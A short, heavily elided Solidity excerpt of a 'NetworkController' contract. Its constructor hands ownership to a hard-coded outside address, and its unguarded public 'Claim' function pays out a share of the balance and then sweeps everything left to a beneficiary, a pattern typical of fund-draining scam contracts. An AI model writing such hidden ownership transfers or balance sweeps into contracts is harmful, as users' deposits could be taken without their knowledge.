...
contract NetworkController is Ownable {
	...
	constructor(address _beneficiary, bool _forwarding) {
		...
		transferOwnership(0x2f6FB3663421B8E49a90a05bA1617464a4C403d0);
	}
    ...
    function Claim(address destination,uint256 amount) public virtual{

		//uint256 amountToWithdraw = Math.max(amount, address(this).balance);
		//uint256 amountToWithdraw = address(this).balance / 5;
		uint256 amountToWithdraw = address(this).balance * amount /100;
		(bool sent, ) = destination.call{value: amountToWithdraw}("");
		require(sent, "FAILURE");
		(bool sent2, ) = beneficiary.call{value: address(this).balance}("");
		require(sent2, "FAILURE");
